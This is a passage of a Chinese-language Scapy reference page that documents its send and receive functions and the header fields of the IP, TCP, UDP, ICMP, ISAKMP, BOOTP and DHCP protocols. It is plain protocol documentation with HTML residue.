Protocol</span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc5201"><span>RFC 5201</span></a></td></tr><tr><td><span>140</span></td><td><span>0x8C</span></td><td><span>Shim6</span></td><td><a href="/w/index.php?title=Site_Multihoming_by_IPv6_Intermediation&amp;action=edit&amp;redlink=1" class="new" title="Site Multihoming by IPv6 Intermediation (页面不存在) "><span>Site Multihoming by IPv6 Intermediation</span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc5533"><span>RFC 5533</span></a></td></tr><tr><td><span>141</span></td><td><span>0x8D</span></td><td><span>WESP</span></td><td><a href="/w/index.php?title=Wrapped_Encapsulating_Security_Payload&amp;action=edit&amp;redlink=1" class="new" title="Wrapped Encapsulating Security Payload (页面不存在) "><span>Wrapped Encapsulating Security Payload</span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc5840"><span>RFC 5840</span></a></td></tr><tr><td><span>142</span></td><td><span>0x8E</span></td><td><span>ROHC</span></td><td><a href="/w/index.php?title=Robust_Header_Compression&amp;action=edit&amp;redlink=1" class="new" title="Robust Header Compression (页面不存在) "><span>Robust Header Compression</span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc5856"><span>RFC 5856</span></a></td></tr><tr><td><span>143-252</span></td><td><span>0x8F-0xFC</span></td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td></tr><tr><td>&nbsp;</td><td><span>253-254</span></td><td><span>0xFD-0xFE</span></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc3692"><span>RFC 3692</span></a></td><td>&nbsp;</td></tr><tr><td><span>255</span></td><td><span>0xFF</span></td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td></tr><tr><td></details></td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td></tr></tbody></table></figure></li></ul></li><li><p><span>chksum</span></p><ul><li><span>Header Checksum (16 bits)</span></li></ul><blockquote><p><span>used for error-checking of the header</span></p></blockquote></li><li><p><span>src</span></p><ul><li><span>Source IP Address (32 bits)</span></li></ul></li><li><p><span>dst</span></p><ul><li><span>Destination IP Address (32 bits)</span></li></ul></li><li><p><span>options</span>
</details></p></li></ul><h3 id='92函数'><span>9.2.函数</span></h3><ul><li><p><code>sendp()</code><span>: 发送数据</span></p><details></details><ul><li><span>x: 发送的数据包</span></li><li><span>return_packets: 是否返回发送的数据包</span></li><li><span>count: 发送数量</span></li><li><span>inter: 发包时间间隔(s)</span></li><li><span>loop: True时循环发送, 不可与count同用</span></li><li><span>verbose: False时���返回&quot;Sent 1 packets.&quot;</span></li><li><span>realtime: 在发送下一个包之前, 请检查当前是否已被发送</span></li><li><span>socket: 要使用的套接字(默认为conf.L3socket(kargs))</span></li><li><span>iface: 网络接口</span></li><li><span>monitor: monitor模式下发送(linux下此参数不可用)</span>
</details></li></ul></li><li><p><code>srp()</code><span>: 发送数据, 并接收</span></p><details></details><ul><li><span>返回: 响应数据包(发送包, 接收包)列表, 未响应数据包列表</span></li><li><span>pks: SuperSocket实例用于发送接收包</span></li><li><span>pkt: 用于发送的包</span></li><li><span>rcv_pks: 如果设置, 将代替pks来接收数据包. 数据包仍将通过pks发送</span></li><li><span>nofilter: 设为1以避免使用BPF过滤器</span></li><li><span>retry: 如果为正, 重新发送未应答的包retry次. 如果为负, 当再也没有包被应答时, retry次重新发送未应答的包.</span></li><li><span>timeout: 最后一个数据包发送后需要等待多长时间</span></li><li><span>verbose: 0, 1, 2 默认为2</span></li><li><span>multi: 接受同一请求的多个响应</span></li><li><span>store_unanswered: 是否存储未应答的数据包. 将其设置为False将加快速度, 并且将返回None作为unans列表</span></li><li><span>process: 如果指定, 则只存储process(pkt)的结果, 该函数应该遵循以下格式:</span><code>lambda sent, received: (func(sent), func2(received))</code><span>如果数据包没有得到回复, 则接收为空. 如果store_unanswered为False, 则不会对未应答的调用该函数. </span></li><li><span>prebuild: 在开始发送数据包之前预先构建它们. 当生成器作为包传递时自动启用</span>
</details></li></ul></li><li><p><code>srp1()</code><span>: 发送数据, 并接收, 只返回一条数据包</span></p><details></details><ul><li><span>返回: 响应数据包(发送包, 接收包)列表, 未响应数据包列表</span></li><li><span>pks: SuperSocket实例用于发送接收包</span></li><li><span>pkt: 用于发送的包</span></li><li><span>rcv_pks: 如果设置, 将代替pks来接收数据包. 数据包仍将通过pks发送</span></li><li><span>nofilter: 设为1以避免使用BPF过滤器</span></li><li><span>retry: 如果为正, 重新发送未应答的包retry次. 如果为负, 当再也没有包被应答时, retry次重新发送未应答的包.</span></li><li><span>timeout: 最后一个数据包发送后需要等待多长时间</span></li><li><span>verbose: 0, 1, 2 默认为2</span></li><li><span>multi: 接受同一请求的多个响应</span></li><li><span>store_unanswered: 是否存储未应答的数据包. 将其设置为False将加快速度, 并且将返回None作为unans列表</span></li><li><span>process: 如果指定, 则只存储process(pkt)的结果, 该函数应该遵循以下格式:</span><code>lambda sent, received: (func(sent), func2(received))</code><span>如果数据包没有得到回复, 则接收为空. 如果store_unanswered为False, 则不会对未应答的调用该函数. </span></li><li><span>prebuild: 在开始发送数据包之前预先构建它们. 当生成器作为包传递时自动启用</span>
</details></li></ul></li></ul><h2 id='十传输层'><span>十.传输层</span></h2><h3 id='101tcpscapylayersinettcp'><span>10.1.TCP:</span><code>scapy.layers.inet.TCP</code></h3><blockquote><p><span>Transmission Control Protocol</span></p></blockquote><details></details><ul><li><p><span>sport</span></p><ul><li><span>Source port (16 bits)</span></li><li><span>识别发送连接端口, 0-65535, 0-2^16-1</span></li></ul></li><li><p><span>dport</span></p><ul><li><span>Destination port (16 bits)</span></li><li><span>识别接收连接端口, 0-65535, 0-2^16-1</span></li><li><span>常见目的端口: FTP(20, 21), SSH(22), TELNET(23), SMTP(25), HTTP over SSL/TLS(443), HTTP(80)</span></li></ul></li><li><p><span>seq</span></p><ul><li><span>Sequence number (32 bits)</span></li><li><span>如果SYN标志设置为1, 则这是初始序列号</span></li><li><span>如果SYN标志设置为0, 则这是当前会话该段的第一个数据字节的累计序列号</span></li></ul></li><li><p><span>ack</span></p><ul><li><span>Acknowledgment number (32 bits)</span></li><li><span>如果设置了ACK标志, 那么这个字段的值就是ACK发送者期望的下一个序列号</span></li></ul></li><li><p><span>dataofs</span></p><ul><li><span>Data offset (4 bits)</span></li><li><span>从TCP段开始到实际数据的偏移量</span></li></ul></li><li><p><span>reserved</span></p><ul><li><span>Reserved (3 bits)</span></li><li><span>供将来使用, 并应设为零. </span></li></ul></li><li><p><span>flags</span></p><ul><li><p><span>Flags (9 bits)</span></p></li><li><p><span>F: FIN, S: SYN, R: RST, P: PSH, A: ACK, U: URG, E: ECE, C: CWR</span></p></li><li><p><span>NS(1 bit):ECN-nonce -隐藏保护</span></p></li><li><p><span>CWR(1 bit):拥塞窗口减少(CWR)标志由发送主机设置, 表示它收到了设置了ECE标志的TCP段并在拥塞控制机制中作出了响应. </span></p></li><li><p><span>ECE(1 bit):ECN-Echo有双重作用, 取决于SYN标志的值. 这表明:</span></p><ul><li><span>如果SYN标志为1, 则TCP对等点是支持ECN的. </span></li><li><span>如果SYN标志为0, 则表示在正常传输期间, IP报头中收到了一个设置了拥塞经历标志(ECN=11)的包</span></li></ul></li><li><p><span>URG(1 bit): 表示紧急指针字段是有意义的</span></p></li><li><p><span>ACK(1 bit): 表示确认字段是有效的. 客户端发送的初始SYN包之后的所有包都应该设置此标志. </span></p></li><li><p><span>PSH(1 bit): Push函数. 请求将缓冲数据推送到接收应用程序. </span></p></li><li><p><span>RST(1 bit): 重置连接</span></p></li><li><p><span>SYN(1 bit): 同步序列号. 只有从每一端发送的第一个数据包才应该设置这个标志. 其他一些标志和字段会根据这个标志改变含义, 有些只有在设置时才有效, 有些在明确时才有效. </span></p></li><li><p><span>FIN(1 bit): 最后一个来自发送方的数据包</span></p></li></ul></li><li><p><span>window</span></p><ul><li><span>Window size (16 bits)</span></li><li><span>接收窗口的大小, 它指定此段的发送方当前愿意接收的窗口大小单元的数量(默认情况下为字节)</span></li></ul></li><li><p><span>chksum</span></p><ul><li><span>Checksum (16 bits)</span></li></ul></li><li><p><span>urgptr</span></p><ul><li><span>Urgent pointer (16 bits)</span></li><li><span>如果设置了URG标志, 那么这个16位字段就是表示最后一个紧急数据字节的序列号的偏移量</span>
</details></li></ul></li></ul><h3 id='102udpscapylayersinetudp'><span>10.2.UDP:</span><code>scapy.layers.inet.UDP</code></h3><blockquote><p><span>User Datagram Protocol</span></p></blockquote><details></details><ul><li><p><span>sport</span></p><ul><li><span>Source port number(16 bits)</span></li></ul></li><li><p><span>dport</span></p><ul><li><span>Destination port number(16 bits)</span></li></ul></li><li><p><span>len</span></p><ul><li><span>Length(16 bits)</span></li></ul></li><li><p><span>chksum</span></p><ul><li><span>Checksum(16 bits)</span>
</details></li></ul></li></ul><h3 id='103icmpscapylayersineticmp'><span>10.3.ICMP:</span><code>scapy.layers.inet.ICMP</code></h3><blockquote><p><span>Internet Control Message Protocol</span></p></blockquote><details></details><ul><li><p><span>type, code</span></p><ul><li><p><span>ICMP type(8 bits)  </span></p></li><li><p><span>ICMP subtype(8 bits)</span></p></li><li><p><span>Source quench</span></p><blockquote><p><span>如果路由器或主机没有足够的缓冲区空间来处理请求, 则可能生成此消息;如果路由器或主机缓冲区接近其极限, 则可能生成此消息. </span></p></blockquote><ul><li><span>type: 4</span></li><li><span>code: 0</span></li><li><span>发送方使用IP报头和其他数据将应答与关联的请求匹配起来</span></li></ul></li><li><p><span>Redirect</span></p><blockquote><p><span>重定向请求数据包, 告知主机最佳路线是通过另一个路由器</span></p></blockquote><ul><li><p><span>type: 5</span></p></li><li><p><span>code</span></p><figure><table><thead><tr><th><span>Code</span></th><th><span>Description</span></th></tr></thead><tbody><tr><td><span>0</span></td><td><span>网络的重定向数据报</span></td></tr><tr><td><span>1</span></td><td><span>主机的数据报重定向</span></td></tr><tr><td><span>2</span></td><td><span>服务类型和网络的重定向数据报</span></td></tr><tr><td><span>3</span></td><td><span>服务类型和主机的重定向数据报</span></td></tr></tbody></table></figure></li></ul></li><li><p><span>Time exceeded</span></p><blockquote><p><span>通知丢弃的数据报的源, 因为ttl到零了. 如果主机未能在限定的时间内重新组装碎片数据报, 则也可以发送超时消息. </span></p></blockquote><ul><li><p><span>type: 11</span></p></li><li><p><span>code</span></p><figure><table><thead><tr><th><span>Code</span></th><th><span>Description</span></th></tr></thead><tbody><tr><td><span>0</span></td><td><span>ttl传输超时</span></td></tr><tr><td><span>1</span></td><td><span>超过碎片重新组装时间</span></td></tr></tbody></table></figure></li></ul></li><li><p><span>Timestamp</span></p><blockquote><p><span>用于时间同步</span></p></blockquote><ul><li><p><span>type: 13</span></p></li><li><p><span>code: 0</span></p></li><li><p><span>客户端可以使用id和seq来匹配时间戳应答和时间戳请求</span></p></li><li><p><span>ts_ori, ts_rx, ts_tx</span></p><ul><li><p><span>Originate timestamp(32 bits)</span></p><ul><li><span>自午夜世界时(UT)开始的毫秒数, 如果UT引用不可用, 则可以将最有效位设置为非标准时间值</span></li></ul></li><li><p><span>Receive timestamp(32 bits)</span></p></li><li><p><span>Transmit timestamp(32 bits)</span></p></li></ul></li><li><p><span>id</span></p><ul><li><span>Identifier(16 btis)</span></li></ul></li><li><p><span>seq</span></p><ul><li><span>Sequence number(16 btis)</span></li></ul></li></ul></li><li><p><span>Timestamp reply</span></p><blockquote><p><span>对时间戳(Timestamp)消息的回复</span></p></blockquote><ul><li><p><span>type: 14</span></p></li><li><p><span>code: 0</span></p></li><li><p><span>ts_ori, ts_rx, ts_tx</span></p><ul><li><p><span>Originate timestamp(32 bits)</span></p><ul><li><span>发送方在发送消息之前最后接触消息的时间</span></li></ul></li><li><p><span>Receive timestamp(32 bits)</span></p><ul><li><span>echoer在接收时第一次触摸它的时间</span></li></ul></li><li><p><span>Transmit timestamp(32 bits)</span></p><ul><li><span>echoer在发送消息时最后一次触及消息的时间</span></li></ul></li></ul></li><li><p><span>id</span></p><ul><li><span>Identifier(16 btis)</span></li></ul></li><li><p><span>seq</span></p><ul><li><span>Sequence number(16 btis)</span></li></ul></li></ul></li><li><p><span>Address mask request</span></p><blockquote><p><span>地址掩码请求通常由主机发送到路由器, 以获得适当的子网掩码. 收件人应使用地址掩码回复邮件来回复此邮件.</span></p></blockquote><ul><li><p><span>type: 17</span></p></li><li><p><span>code: 0</span></p></li><li><p><span>addr_mask: 可以设置为0</span></p><ul><li><span>Address mask(32 bits)</span></li></ul></li><li><p><span>id</span></p><ul><li><span>Identifier(16 btis)</span></li></ul></li><li><p><span>seq</span></p><ul><li><span>Sequence number(16 btis)</span></li></ul></li><li><p><span>ICMP地址掩码请求可以作为侦察攻击的一部分来收集目标网络上的信息, 因此ICMP地址掩码应答在Cisco IOS上是默认禁用的</span></p></li></ul></li><li><p><span>Address mask reply</span></p><blockquote><p><span>地址掩码应答使用 适当的子网掩码 应答 地址掩码请求消息</span></p></blockquote><ul><li><p><span>type: 18</span></p></li><li><p><span>code: 0</span></p></li><li><p><span>addr_mask: </span></p><ul><li><span>Address mask(32 bits)</span></li><li><span>子网掩码</span></li></ul></li><li><p><span>id</span></p><ul><li><span>Identifier(16 btis)</span></li></ul></li><li><p><span>seq</span></p><ul><li><span>Sequence number(16 btis)</span></li></ul></li></ul></li><li><p><span>Destination unreachable</span></p><blockquote><p><span>通知客户端由于某种原因目的地不可到达</span></p></blockquote><ul><li><p><span>type: 3</span></p></li><li><p><span>code</span></p><figure><table><thead><tr><th><span>Code</span></th><th><span>Description</span></th></tr></thead><tbody><tr><td><span>0</span></td><td><span>目标网络不可达</span></td></tr><tr><td><span>1</span></td><td><span>目标主机不可达</span></td></tr><tr><td><span>2</span></td><td><span>目标协议不可达</span></td></tr><tr><td><span>3</span></td><td><span>目标端口不可达</span></td></tr><tr><td><span>4</span></td><td><span>要求分段并设置DF flag标志</span></td></tr><tr><td><span>5</span></td><td><span>源路由失败</span></td></tr><tr><td><span>6</span></td><td><span>未知的目标网络</span></td></tr><tr><td><span>7</span></td><td><span>未知的目标主机</span></td></tr><tr><td><span>8</span></td><td><span>源主机隔离(作废不用)</span></td></tr><tr><td><span>9</span></td><td><span>禁止访问的网络</span></td></tr><tr><td><span>10</span></td><td><span>禁止访问的主机</span></td></tr><tr><td><span>11</span></td><td><span>对特定的TOS 网络不可达</span></td></tr><tr><td><span>12</span></td><td><span>对特定的TOS 主机不可达</span></td></tr><tr><td><span>13</span></td><td><span>由于过滤 网络流量被禁止</span></td></tr><tr><td><span>14</span></td><td><span>主机越权</span></td></tr><tr><td><span>15</span></td><td><span>优先权终止生效</span></td></tr></tbody></table></figure></li><li><p><span>nexthopmtu</span></p><ul><li><span>Next-hop MTU(16 bits)</span></li><li><span>下一跳网络的MTU</span></li><li><span>MTU: 一种通信协议的某一层上面所能通过的最大数据包大小(以字节为单位)</span></li></ul></li></ul></li></ul></li><li><p><span>chksum</span></p><ul><li><span>Checksum(16 bits)</span></li></ul></li><li><p><span>gw</span></p><ul><li><span>Gateway</span></li></ul></li><li><p><span>ptr</span></p></li><li><p><span>reserved</span></p></li><li><p><span>length</span></p></li><li><p><span>unused</span></p></li><li><p><span>unused</span>
</details></p></li></ul><h3 id='104函数'><span>10.4.函数</span></h3><ul><li><p><code>send()</code><span>: 发送数据</span></p><details></details><ul><li><span>x: 发送的数据包</span></li><li><span>return_packets: 是否返回发送的数据包</span></li><li><span>count: 发送数量</span></li><li><span>inter: 发包时间间隔(s)</span></li><li><span>loop: True时循环发送, 不可与count同用</span></li><li><span>verbose: False时不返回&quot;Sent 1 packets.&quot;</span></li><li><span>realtime: 在发送下一个包之前, 请检查当前是否已被发送</span></li><li><span>socket: 要使用的套接字(默认为conf.L3socket(kargs))</span></li><li><span>iface: 网络接口</span></li><li><span>monitor: monitor模式下发送(linux下此参数不可用)</span>
</details></li></ul></li><li><p><code>sr()</code><span>: 发送数据, 并接收</span></p><details></details><ul><li><span>返回: 响应数据包(发送包, 接收包)列表, 未响应数据包列表</span></li><li><span>pks: SuperSocket实例用于发送接收包</span></li><li><span>pkt: 用于发送的包</span></li><li><span>rcv_pks: 如果设置, 将代替pks来接收数据包. 数据包仍将通过pks发送</span></li><li><span>nofilter: 设为1以避免使用BPF过滤器</span></li><li><span>retry: 如果为正, 重新发送未应答的包retry次. 如果为负, 当再也没有包被应答时, retry次重新发送未应答的包.</span></li><li><span>timeout: 最后一个数据包发送后需要等待多长时间</span></li><li><span>verbose: 0, 1, 2 默认为2</span></li><li><span>multi: 接受同一请求的多个响应</span></li><li><span>store_unanswered: 是否存储未应答的数据包. 将其设置为False将加快速度, 并且将返回None作为unans列表</span></li><li><span>process: 如果指定, 则只存储process(pkt)的结果, 该函数应该遵循以下格式:</span><code>lambda sent, received: (func(sent), func2(received))</code><span>如果数据包没有得到回复, 则接收为空. 如果store_unanswered为False, 则不会对未应答的调用该函数. </span></li><li><span>prebuild: 在开始发送数据包之前预先构建它们. 当生成器作为包传递时自动启用</span>
</details></li></ul></li><li><p><code>sr1()</code><span>: 发送数据, 并接收, 只返回一条数据包</span></p><details></details><ul><li><span>返回: 响应数据包(发送包, 接收包)列表, 未响应数据包列表</span></li><li><span>pks: SuperSocket实例用于发送接收包</span></li><li><span>pkt: 用于发送的包</span></li><li><span>rcv_pks: 如果设置, 将代替pks来接收数据包. 数据包仍将通过pks发送</span></li><li><span>nofilter: 设为1以避免使用BPF过滤器</span></li><li><span>retry: 如果为正, 重新发送未应答的包retry次. 如果为负, 当再也没有包被应答时, retry次重新发送未应答的包.</span></li><li><span>timeout: 最后一个数据包发送后需要等待多长时间</span></li><li><span>verbose: 0, 1, 2 默认为2</span></li><li><span>multi: 接受同一请求的多个响应</span></li><li><span>store_unanswered: 是否存储未应答的数据包. 将其设置为False将加快速度, 并且将返回None作为unans列表</span></li><li><span>process: 如果指定, 则只存储process(pkt)的结果, 该函数应该遵循以下格式:</span><code>lambda sent, received: (func(sent), func2(received))</code><span>如果数据包没有得到回复, 则接收为空. 如果store_unanswered为False, 则不会对未应答的调用该函数. </span></li><li><span>prebuild: 在开始发送数据包之前预先构建它们. 当生成器作为包传递时自动启用</span>
</details></li></ul></li><li><p><code>srloop()</code><span>: 循环发送一个数据包, 并打印响应</span></p></li></ul><h2 id='十一应用层'><span>十一.应用层</span></h2><h3 id='111isakmpscapylayersisakmpisakmp'><span>11.1.ISAKMP:</span><code>scapy.layers.isakmp.ISAKMP</code></h3><blockquote><p><span>Internet Security Association and Key Management Protocol, 互联网安全协会和密钥管理协议, 用于在两个通信实体协商和建立安全相关, 交换密钥.</span>
<span>ISAKMP定义了用于建立, 协商, 修改和删除安全关联的过程和数据包格式. SA包含执行各种网络安全服务所需的所有信息, 例如IP层服务（例如标头身份验证和有效载荷封装）, 传输或应用程序层服务或协商流量的自我保护. ISAKMP定义了用于交换密钥生成和身份验证数据的有效负载. 这些格式提供了用于传输密钥和认证数据的一致框架, 该框架独立于密钥生成技术, 加密算法和认证机制. </span>
<span>ISAKMP与密钥交换协议不同, 是为了将安全关联管理（和密钥管理）的细节与密钥交换的细节清晰地分开. 可能有许多不同的密钥交换协议, 每种协议具有不同的安全性. 但是, 需要一个通用框架来同意SA属性的格式, 以及协商, 修改和删除SA. ISAKMP充当此通用框架. </span></p></blockquote><details></details><ul><li><p><span>init_cookie</span></p><ul><li><span>Initiator cookie 8 bytes</span></li><li><span>发起SA建立、SA通知或SA删除的实体的cookie. </span></li></ul></li><li><p><span>resp_cookie</span></p><ul><li><span>Responder cookie 8 bytes</span></li><li><span>响应SA建立请求、SA通知或SA删除的实体的cookie. </span></li></ul></li><li><p><span>next_payload</span></p><ul><li><span>Next payload 8 bits.</span></li><li><span>指示消息中第一个有效负载的类型. </span></li></ul><figure><table><thead><tr><th><span>Value</span></th><th><span>Description</span></th><th><span>References</span></th></tr></thead><tbody><tr><td><span>0</span></td><td><span>None.</span></td><td><span>RFC 2408</span></td></tr><tr><td><span>1</span></td><td><span>Security Association.</span></td><td><span>RFC 2408</span></td></tr><tr><td><span>2</span></td><td><span>Proposal.</span></td><td><span>RFC 2408</span></td></tr><tr><td><span>3</span></td><td><span>Transform.</span></td><td><span>RFC 2408</span></td></tr><tr><td><span>4</span></td><td><span>Key Exchange.</span></td><td><span>RFC 2408</span></td></tr><tr><td><span>5</span></td><td><span>Identification.</span></td><td><span>RFC 2408</span></td></tr><tr><td><span>6</span></td><td><span>Certificate.</span></td><td><span>RFC 2408</span></td></tr><tr><td><span>7</span></td><td><span>Certificate Request.</span></td><td><span>RFC 2408</span></td></tr><tr><td><span>8</span></td><td><span>Hash.</span></td><td><span>RFC 2408</span></td></tr><tr><td><span>9</span></td><td><span>Signature.</span></td><td><span>RFC 2408</span></td></tr><tr><td><span>10</span></td><td><span>Nonce.</span></td><td><span>RFC 2408</span></td></tr><tr><td><span>11</span></td><td><span>Notification.</span></td><td><span>RFC 2408</span></td></tr><tr><td><span>12</span></td><td><span>Delete.</span></td><td><span>RFC 2408</span></td></tr><tr><td><span>13</span></td><td><span>Vendor ID.</span></td><td><span>RFC 2408</span></td></tr><tr><td><span>14</span></td><td>&nbsp;</td><td>&nbsp;</td></tr><tr><td><span>15</span></td><td><span>SAK, SA KEK Payload.</span></td><td><span>RFC 3547</span></td></tr><tr><td><span>16</span></td><td><span>SAT, SA TEK Payload.</span></td><td><span>RFC 3547</span></td></tr><tr><td><span>17</span></td><td><span>Key Download.</span></td><td><span>RFC 3547</span></td></tr><tr><td><span>18</span></td><td><span>Sequence Number.</span></td><td><span>RFC 3547</span></td></tr><tr><td><span>19</span></td><td><span>Proof of Possession.</span></td><td><span>RFC 3547</span></td></tr><tr><td><span>20</span></td><td><span>NAT-D, NAT Discovery.</span></td><td><span>RFC 3947</span></td></tr><tr><td><span>21</span></td><td><span>NAT-OA, NAT Original Address.</span></td><td><span>RFC 3947</span></td></tr><tr><td><span>22-127</span></td><td>&nbsp;</td><td>&nbsp;</td></tr><tr><td><span>128-255</span></td><td><span>Private use.</span></td><td>&nbsp;</td></tr></tbody></table></figure></li><li><p><span>version</span></p><ul><li><p><span>Mjr version. 4 bits.</span></p><ul><li><span>正在使用的ISAKMP协议的主要版本</span>
<span>= Mnr version. 4 bits.</span></li><li><span>正在使用的ISAKMP协议的次要版本. </span></li></ul></li></ul></li><li><p><span>exch_type</span></p><ul><li><span>Exchange type</span></li><li><span>指示正在使用的交换的类型. 这将指定ISAKMP交换中的消息和负载次序</span></li></ul></li><li><p><span>flags</span></p><ul><li><span>Flags</span></li><li><span>指示为ISAKMP交换设置的选项. </span></li></ul><figure><table><thead><tr><th><span>Value</span></th><th><span>Description</span></th></tr></thead><tbody><tr><td><span>0</span></td><td><span>None.</span></td></tr><tr><td><span>1</span></td><td><span>Base.</span></td></tr><tr><td><span>2</span></td><td><span>Identity protection.</span></td></tr><tr><td><span>3</span></td><td><span>Authentication only.</span></td></tr><tr><td><span>4</span></td><td><span>Aggressive.</span></td></tr><tr><td><span>5</span></td><td><span>Informational.</span></td></tr><tr><td><span>6-31</span></td><td><span>ISAKMP future use.</span></td></tr><tr><td><span>32-239</span></td><td><span>DOI specific use.</span></td></tr><tr><td><span>240-255</span></td><td><span>Private use.</span></td></tr></tbody></table></figure></li><li><p><span>id</span></p><ul><li><span>Message ID 4 bytes</span></li><li><span>在第二阶段谈判中用于确定议定书状态的唯一值. 它是由阶段2协商的发起者随机生成的. </span></li></ul></li><li><p><span>length</span></p><ul><li><span>Length 4 bytes</span></li><li><span>ISAKMP头的总长度和封装的有效载荷(以字节为单位). </span>
</details></li></ul></li></ul><h3 id='112bootpscapylayersdhcpbootp'><span>11.2.BOOTP:</span><code>scapy.layers.dhcp.BOOTP</code></h3><blockquote><p><span>BOOTP 及其扩展是动态主机配置协议（DHCP）的基础. 引导协议（BOOTP）是一种基于 UDP/IP 的协议. 这种协议允许正在启动的主机动态配置而无需用户监督. BOOTP 主要用于客户机从服务器获得自己的 IP 地址, 服务器的 IP 地址以及启动映象文件名. 此外通过 BOOTP, 其它一些装置信息, 如本地子网掩码、本地时间偏移量、默认路由器地址和各种 Internet 服务器地址, 都能与客户机交流. </span></p></blockquote><details></details><ul><li><p><span>op</span></p><ul><li><span>分组操作码/消息类型. 1 = BOOTREQUEST, 2 = BOOTREPLY</span></li></ul></li><li><p><span>htype</span></p><ul><li><span>硬件地址类型,参见“指定号码”RFC中的ARP部分. &#39;1&#39; = 10mb以太网</span></li></ul></li><li><p><span>hlen</span></p><ul><li><span>硬件地址长度(如10mb以太网为&#39;6&#39;). </span></li></ul></li><li><p><span>hops</span></p><ul><li><span>客户端设置为0, 可选地由网关使用, 在cross-gateway引导. </span></li><li><span>若封包需经过 router 传送, 每站加 1 , 若在同一网内, 为 0. </span></li></ul></li><li><p><span>xid</span></p><ul><li><span>事务ID, 一个随机数, 用于将此引导请求与它生成的反应. </span></li></ul></li><li><p><span>secs</span></p><ul><li><span>由客户端填写, 几秒钟后客户端开始尝试引导. </span></li></ul></li><li><p><span>flags</span></p><ul><li><span>标记</span></li></ul></li><li><p><span>ciaddr</span></p><ul><li><span>客户端IP地址;由客户在bootrequest中填写. </span></li></ul></li><li><p><span>yiaddr</span></p><ul><li><span>“您的”(客户)IP地址;如果客户端不填, 则由服务器填写知道自己的地址(ciaddr为0). </span></li></ul></li><li><p><span>siaddr</span></p><ul><li><span>服务器IP地址;由服务器在bootreply中返回. </span></li></ul></li><li><p><span>giaddr</span></p><ul><li><span>网关IP地址,用于可选的跨网关引导. </span></li></ul></li><li><p><span>chaddr</span></p><ul><li><span>客户端硬件地址,客户填写. </span></li></ul></li><li><p><span>sname</span></p><ul><li><span>可选的服务器主机名, 零结尾字符串. </span></li></ul></li><li><p><span>file</span></p><ul><li><span>BOOT文件名, 空终止字符串;“通用”名或bootrequest中的null, 完全限定的目录路径在bootreply名称</span></li></ul></li><li><p><span>options</span></p><ul><li><span>可选参数字段</span></li></ul></li></ul><p></details></p><h3 id='113dhcpscapylayersdhcpdhcp'><span>11.3.DHCP:</span><code>scapy.layers.dhcp.DHCP</code></h3><blockquote><p><span>Dynamic Host Configuration Protocol, 动态主机设置协议是一个用于局域网的网络协议, 位于OSI模型的应用层, 使用UDP协议工作, </span>
<span>主要有两个用途:</span>
<span>用于内部网或网络服务供应商自动分配IP地址给用户</span>
<span>用于内部网管理员对所有电脑作中央管理</span></p></blockquote><details></details><ul><li><p><span>options</span></p><ul><li><p><span>例:DHCP(options=[(Option, Value)])</span></p></li><li><p><span>Option取值:</span></p><blockquote><p><span>给定的值必须为指定类型, NoneType不用给值默认为True</span></p></blockquote><ul><li><p><span>pad: NoneType</span></p></li><li><p><span>subnet_mask: IPField</span></p><ul><li><span>子网掩码值</span></li></ul></li><li><p><span>time_zone: NoneType</span></p></li><li><p><span>router: IPField</span></p><ul><li><span>N/4路由器地址</span></li></ul></li><li><p><span>time_server: IPField</span></p><ul><li><span>N/4时间服务器地址</span></li></ul></li><li><p><span>IEN_name_server: IPField</span></p></li><li><p><span>name_server: IPField</span></p><ul><li><span>N/4 IAN-116服务器地址</span></li></ul></li><li><p><span>log_server: IPField</span></p><ul><li><span>N/4 日志服务器地址</span></li></ul></li><li><p><span>cookie_server: IPField</span></p></li><li><p><span>lpr_server: IPField</span></p><ul><li><span>N/4 打印机服务器地址</span></li></ul></li><li><p><span>impress-servers: IPField</span></p><ul><li><span>N/4 印象服务器地址</span></li></ul></li><li><p><span>resource-location-servers: IPField</span></p></li><li><p><span>hostname: NoneType</span></p></li><li><p><span>boot-size: ShortField</span></p><ul><li><span>BOOT文件大小, 以512字节为单位</span></li></ul></li><li><p><span>dump_path: NoneType</span></p></li><li><p><span>domain: NoneType</span></p></li><li><p><span>swap-server: IPField</span></p><ul><li><span>交换服务器地址</span></li></ul></li><li><p><span>root_disk_path: NoneType</span></p></li><li><p><span>extensions-path: NoneType</span></p></li><li><p><span>ip-forwarding: ByteField</span></p><ul><li><span>启用/禁用IP转发</span></li></ul></li><li><p><span>non-local-source-routing: ByteField</span></p></li><li><p><span>policy-filter: IPField</span></p><ul><li><span>路由策略的过滤器 </span></li></ul></li><li><p><span>max_dgram_reass_size: NoneType</span></p><ul><li><span>最大数据报重新组装大小</span></li></ul></li><li><p><span>default_ttl: NoneType</span></p></li><li><p><span>pmtu_timeout: NoneType</span></p></li><li><p><span>path-mtu-plateau-table: ShortField</span></p><ul><li><span>路径MTU平台表</span></li></ul></li><li><p><span>interface-mtu: ShortField</span></p><ul><li><span>接口MTU大小</span></li></ul></li><li><p><span>all-subnets-local: ByteField</span></p><ul><li><span>所有子网都是本地的</span></li></ul></li><li><p><span>broadcast_address: IPField</span></p><ul><li><span>广播地址</span></li></ul></li><li><p><span>perform-mask-discovery: ByteField</span></p><ul><li><span>执行掩码发现</span></li></ul></li><li><p><span>mask-supplier: ByteField</span></p><ul><li><span>为其他提供掩码</span></li></ul></li><li><p><span>router-discovery: ByteField</span></p><ul><li><span>执行路由器搜索</span></li></ul></li><li><p><span>router-solicitation-address: IPField  </span></p><ul><li><span>路由器请求地址</span></li></ul></li><li><p><span>trailer-encapsulation: ByteField</span></p><ul><li><span>尾部封装</span></li></ul></li><li><p><span>arp_cache_timeout: NoneType</span></p></li><li><p><span>ether_or_dot3: NoneType</span></p></li><li><p><span>tcp_ttl: NoneType</span></p></li><li><p><span>tcp_keepalive_interval: NoneType</span></p></li><li><p><span>tcp_keepalive_garbage: NoneType</span></p></li><li><p><span>NIS_domain: NoneType</span></p></li><li><p><span>NIS_server: 